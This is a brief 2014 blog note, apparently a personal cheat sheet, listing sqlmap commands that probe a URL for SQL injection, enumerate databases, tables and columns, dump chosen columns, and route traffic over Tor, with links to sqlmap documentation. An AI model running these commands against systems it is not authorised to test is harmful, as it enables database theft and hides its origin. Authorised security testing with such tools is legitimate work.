Title: sqlmap Cheat Sheet  
Date: 2014-12-01 05:04  
Author: fkz  
Category: Note  
Tags: SQL Injection, sqlmap, Security  
Slug: sqlmap-cheat-sheet  
  
  
# Usage  
  
+ `$ sqlmap -u ${url}`  
+ `$ sqlmap -u ${url} --dbs`  
+ `$ sqlmap -u ${url} -D ${database} --tables`  
+ `$ sqlmap -u ${url} -D ${database} -T ${table} --columns`  
+ `$ sqlmap -u ${url} -D ${database} -T ${table} -C ${col1},${col2} --dump`  
  
  
# Options  
  
+ `--tor --tor-type=SOCKS5`  
  
  
# References  
  
+ [sqlmap注入常见用法一条龙](http://www.nigesb.com/sqlmap-common-usage-and-examples.html)  
+ [sqlmap - Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)  
+ [An Old man lab0ratory: Sqlmap tutorial - you are just unavoidable](http://oldmanlab.blogspot.tw/2012/03/sqlmap-tutorial-you-are-just.html)  
+ [Usage · sqlmapproject/sqlmap Wiki · GitHub](https://github.com/sqlmapproject/sqlmap/wiki/Usage)  
